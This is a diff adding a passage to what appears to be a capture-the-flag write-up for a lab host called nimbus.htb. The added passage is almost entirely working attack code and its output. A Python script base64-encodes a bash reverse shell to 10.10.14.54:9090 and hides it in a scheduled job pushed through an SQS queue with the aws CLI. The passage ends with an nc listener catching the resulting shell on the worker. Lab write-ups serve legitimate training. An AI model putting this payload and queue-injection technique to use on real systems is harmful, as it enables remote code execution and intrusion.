@@ -382,5 +382,60 @@ User-Agent: curl/8.14.1
 Accept: */*
 
 ```
+``` python
+import subprocess
+import json
+import base64
+
+payload = "bash -c 'bash -i >& /dev/tcp/10.10.14.54/9090 0>&1'"
+b64 = base64.b64encode(payload.encode()).decode()
+
+script = (
+    "import base64,os;"
+    f"os.system(base64.b64decode('{b64}').decode())"
+)
+
+message_body = {
+    "name": "probe",
+    "schedule": "* * * * *",
+    "runtime": "python3.11",
+    "script": script
+}
+
+
+cmd = [
+    "aws", "sqs", "send-message",
+    "--queue-url", "http://aws.nimbus.htb/847219365028/nimbus-jobs",
+    "--message-body", json.dumps(message_body),
+    "--endpoint-url", "http://aws.nimbus.htb"
+]
+
+r = subprocess.run(cmd, capture_output=True, text=True)
+print(r.returncode, r.stdout, r.stderr)
+
+```
+
+
+``` bash
+
+❯ python3 rce.py
+0 {
+    "MD5OfMessageBody": "bdccf9d3850b0041dab3fba5f4ab14b5",
+    "MessageId": "0a9c9b78-5e28-4d03-9471-ed073aa2546a"
+}
+
+```
+``` bash
+
+❯ nc -lvnp 9090
+listening on [any] 9090 ...
+connect to [10.10.14.54] from (UNKNOWN) [10.129.42.21] 50120
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+worker@a147090e066a:/app$
+
+```
+
+
 
 
